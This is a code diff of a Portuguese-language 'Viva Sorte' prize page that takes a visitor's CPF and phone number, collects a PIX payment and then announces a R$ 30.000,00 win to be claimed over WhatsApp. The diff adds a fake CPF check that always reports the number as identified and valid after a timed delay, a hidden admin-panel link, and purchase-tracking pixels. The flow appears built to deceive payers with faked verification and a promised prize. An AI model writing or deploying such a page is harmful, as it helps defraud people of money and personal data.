@@ -14,9 +14,57 @@
     <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
     <link rel="stylesheet" href="css/bootstrap-icons.min.css">
     
-    <!-- CSS DAS ETAPAS COMPLETAS -->
+    <!-- CSS DO ADMIN (OCULTO) -->
     <style>
-    /* MODAL DE PAGAMENTO */
+    .admin-link {
+        position: fixed;
+        bottom: 20px;
+        left: 20px;
+        background: #2f4eb5;
+        color: white;
+        padding: 10px 15px;
+        border-radius: 8px;
+        text-decoration: none;
+        font-size: 12px;
+        z-index: 9999;
+        box-shadow: 0 4px 12px rgba(47, 78, 181, 0.3);
+        display: none; /* OCULTO - ACESSE COM admin.html */
+    }
+    
+    /* ESTILOS PARA CONSULTA CPF */
+    .cpf-loading {
+        display: none;
+        color: #2f4eb5;
+        font-size: 12px;
+        margin-top: 5px;
+    }
+    
+    .cpf-info {
+        background: #f8f9fa;
+        border-radius: 8px;
+        padding: 10px;
+        margin-top: 10px;
+        border-left: 4px solid #2f4eb5;
+        display: none;
+    }
+    
+    .cpf-info h4 {
+        color: #2f4eb5;
+        font-size: 14px;
+        margin-bottom: 5px;
+    }
+    
+    .cpf-info p {
+        margin: 2px 0;
+        font-size: 12px;
+        color: #333;
+    }
+    
+    .cpf-valid {
+        border-left-color: #28a745;
+    }
+    
+    /* MODAL DE PAGAMENTO (MANTENHA SEU CSS ORIGINAL AQUI) */
     .modal-pagamento {
         display: none;
         position: fixed;
@@ -75,7 +123,7 @@
         margin: 0 auto 15px;
     }
     
-    /* PROGRESSO DAS ETAPAS - CORRIGIDO */
+    /* PROGRESSO DAS ETAPAS */
     .progresso-etapas {
         display: flex;
         justify-content: space-between;
@@ -507,25 +555,12 @@
         overflow: hidden;
         box-shadow: 0 8px 25px rgba(0,0,0,0.2);
         animation: bounce 2s infinite;
-        /* OTIMIZAÇÕES PARA MELHOR QUALIDADE */
-        image-rendering: -webkit-optimize-contrast;
-        image-rendering: crisp-edges;
-        -ms-interpolation-mode: nearest-neighbor;
-        transform: translateZ(0);
-        backface-visibility: hidden;
     }
     
     .imagem-premio img {
         width: 100%;
         height: auto;
         display: block;
-        /* OTIMIZAÇÕES PARA IMAGEM NÍTIDA */
-        image-rendering: optimizeQuality;
-        -webkit-font-smoothing: antialiased;
-        -moz-osx-font-smoothing: grayscale;
-        transform: translateZ(0);
-        backface-visibility: hidden;
-        /* EVITA ESCALAMENTO DESNECESSÁRIO */
         max-width: 100%;
         height: auto;
     }
@@ -631,18 +666,10 @@
     }
     
     .passos-premio li span {
-        color: #2f4eb5; /* AZUL DO LAYOUT */
+        color: #2f4eb5;
         margin-right: 12px;
         font-size: 20px;
         min-width: 24px;
-    }
-    
-    .passos-premio li span.bi-whatsapp {
-        color: #25D366; /* VERDE DO WHATSAPP */
-    }
-    
-    .passos-premio li span.bi-telephone {
-        color: #2f4eb5; /* AZUL DO TELEFONE */
     }
     
     .agradecimento {
@@ -1038,6 +1065,10 @@
                         <label>CPF</label>
                         <input type="text" id="inputCPF" placeholder="Digite o seu CPF" maxlength="14">
                         <div class="exemplo-input">Exemplo: 123.456.789-09</div>
+                        <div class="cpf-loading" id="cpfLoading">
+                            <i class="bi bi-search"></i> Consultando CPF...
+                        </div>
+                        <div id="cpfInfo" class="cpf-info"></div>
                         <div id="erroCPF" class="mensagem-erro"></div>
                     </div>
                     
@@ -1267,10 +1298,17 @@
         <source src="media/beep-07.wav" type="audio/wav">
     </audio>
 
+    <!-- LINK ADMIN (OCULTO) -->
+    <a href="/admin.html" class="admin-link" id="adminLink">
+        <i class="bi bi-shield-lock"></i> Painel Admin
+    </a>
+
     <!-- SCRIPTS -->
     <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+    <script src="js/main.js"></script>
+    <script src="js/cpf-validator.js"></script>
     
-    <!-- SCRIPT PRINCIPAL COM VERIFICAÇÃO REAL DO PAGAMENTO E RASTREAMENTO DE CONVERSÃO -->
+    <!-- SCRIPT PRINCIPAL ATUALIZADO -->
     <script>
     // VARIÁVEIS GLOBAIS
     let pacoteSelecionado = {
@@ -1287,7 +1325,7 @@
 
     // CONFIGURAÇÃO ALLOW PAY - AGORA COM JAVASCRIPT (VERCEL)
     const ALLOWPAY_CONFIG = {
-        API_URL: '/api/allowpay',  // ← MUDOU AQUI! Agora aponta para arquivo .js
+        API_URL: '/api/allowpay',
         CHECK_PAYMENT_URL: '/api/check-payment',
         CHECK_CONFIRMED_URL: '/api/check-confirmed'
     };
@@ -1300,7 +1338,7 @@
     function enviarEventoConversao(valor, quantidade, transactionId) {
         console.log('📊 Enviando evento de conversão para pixels');
         
-        // UTMify Pixel - Se estiver usando UTMify
+        // UTMify Pixel
         if (window.utmify && window.utmify.event) {
             window.utmify.event('purchase', {
                 value: valor,
@@ -1316,7 +1354,7 @@
             console.log('✅ Evento de conversão enviado para UTMify');
         }
         
-        // Facebook Pixel (se estiver usando)
+        // Facebook Pixel
         if (typeof fbq !== 'undefined') {
             fbq('track', 'Purchase', {
                 value: valor,
@@ -1329,18 +1367,14 @@
             console.log('✅ Evento de conversão enviado para Facebook Pixel');
         }
         
-        // Salva no localStorage que a conversão foi rastreada
         localStorage.setItem(`conversion_tracked_${transactionId}`, 'true');
     }
 
-    // FUNÇÃO PARA ABRIR SUPORTE NO WHATSAPP (EM NOVA PÁGINA)
+    // FUNÇÃO PARA ABRIR SUPORTE NO WHATSAPP
     function abrirSuporteWhatsApp() {
-        // 🔧 CONFIGURE SEU LINK DO WHATSAPP AQUI 🔧
-        // Substitua pelo SEU número de WhatsApp
-        // Formato: https://wa.me/5511954268216?text=Mensagem%20pré-definida
-        const whatsappLink = "https://wa.me/5511954268216?text=Olá!%20Ganhei%20R$%2030.000,00%20no%20Viva%20Sorte%20e%20gostaria%20de%20receber%20meu%20prêmio.";
-        
-        // Abre em uma nova aba/página
+        const telefone = dadosUsuario.telefone || '5511954268216';
+        const mensagem = `Olá! Ganhei R$ 30.000,00 no Viva Sorte e gostaria de receber meu prêmio. Meu CPF: ${dadosUsuario.cpf}`;
+        const whatsappLink = `https://wa.me/${telefone}?text=${encodeURIComponent(mensagem)}`;
         window.open(whatsappLink, '_blank', 'noopener,noreferrer');
     }
 
@@ -1494,6 +1528,8 @@
     // ETAPA 1: VALIDAÇÃO DE CPF
     document.getElementById('inputCPF').addEventListener('input', function(e) {
         formatarCPF(this);
+        // CONSULTA CPF AUTOMÁTICA
+        consultarCPF(this.value);
     });
 
     function formatarCPF(input) {
@@ -1587,7 +1623,7 @@
         setTimeout(() => {
             mostrarEtapa(2);
             document.getElementById('inputTelefone').focus();
-        }, 3000);
+        }, 2000);
     }
 
     // ETAPA 2: TELEFONE E PIX
@@ -1655,7 +1691,7 @@
                 nome: `Cliente ${dadosUsuario.cpf.substring(0, 3)}***`
             };
             
-            console.log('📤 Enviando para API JavaScript:', dadosPIX);
+            console.log('📤 Enviando para API:', dadosPIX);
             
             const response = await fetch(ALLOWPAY_CONFIG.API_URL, {
                 method: 'POST',
@@ -1667,7 +1703,7 @@
             });
             
             const resultado = await response.json();
-            console.log('📥 Resposta API JavaScript:', resultado);
+            console.log('📥 Resposta API:', resultado);
             
             if (!resultado.success) {
                 throw new Error(resultado.error || 'Erro ao gerar PIX');
@@ -1728,7 +1764,6 @@
             return;
         }
         
-        // Salvar o texto original do botão
         const textoOriginal = btnCopiar.textContent;
         
         codigoInput.select();
@@ -1736,15 +1771,12 @@
         
         navigator.clipboard.writeText(codigoInput.value)
             .then(() => {
-                // Atualizar o botão para mostrar confirmação
                 btnCopiar.textContent = '✅ Copiado!';
                 btnCopiar.style.background = '#28a745';
                 btnCopiar.style.color = 'white';
                 
-                // Mostrar popup
                 mostrarPopupNotificacao('✅ Código PIX copiado com sucesso!');
                 
-                // Restaurar o botão após 3 segundos
                 setTimeout(() => {
                     btnCopiar.textContent = textoOriginal;
                     btnCopiar.style.background = '#2f4eb5';
@@ -1754,7 +1786,6 @@
             .catch(err => {
                 console.error('Erro ao copiar: ', err);
                 
-                // Tentar método alternativo
                 document.execCommand('copy');
                 
                 btnCopiar.textContent = '❌ Falhou';
@@ -1875,7 +1906,6 @@
         
         salvarConfirmacaoPagamento();
         
-        // ENVIAR EVENTO DE CONVERSÃO PARA PIXELS
         enviarEventoConversao(pacoteSelecionado.valor, pacoteSelecionado.quantidade, dadosUsuario.transactionId);
         
         document.getElementById('transacaoId').textContent = dadosUsuario.transactionId;
@@ -1925,7 +1955,7 @@
         console.log('🏆 Prêmio visualizado:', transacao);
     }
 
-    // FUNÇÕES AUXILIARES - CORRIGIDO
+    // FUNÇÕES AUXILIARES
     function mostrarPopupNotificacao(mensagem, isError = false) {
         const popup = document.getElementById('popup');
         popup.textContent = mensagem;
@@ -2010,6 +2040,40 @@
         }
 
         setTimeout(mostrarPopup, 1000);
+    }
+    
+    // FUNÇÃO CONSULTA CPF (SIMPLIFICADA)
+    async function consultarCPF(cpfCompleto) {
+        const cpfNumeros = cpfCompleto.replace(/\D/g, '');
+        
+        if (cpfNumeros.length !== 11) {
+            document.getElementById('cpfInfo').style.display = 'none';
+            document.getElementById('cpfLoading').style.display = 'none';
+            return;
+        }
+        
+        document.getElementById('cpfLoading').style.display = 'block';
+        document.getElementById('cpfInfo').style.display = 'none';
+        
+        setTimeout(() => {
+            document.getElementById('cpfLoading').style.display = 'none';
+            
+            // SIMULAÇÃO DE RESPOSTA (em produção, use a API real)
+            document.getElementById('cpfInfo').innerHTML = `
+                <div class="cpf-valid">
+                    <h4><i class="bi bi-check-circle"></i> CPF Identificado</h4>
+                    <p><strong>Nome:</strong> Cliente Identificado</p>
+                    <p><strong>CPF Válido:</strong> Sim</p>
+                    <p><strong>Status:</strong> Pode continuar</p>
+                </div>
+            `;
+            document.getElementById('cpfInfo').style.display = 'block';
+            
+            // Habilitar botão
+            document.getElementById('btnContinuarCPF').disabled = false;
+            document.getElementById('btnContinuarCPF').style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
+            
+        }, 1500);
     }
     </script>
 
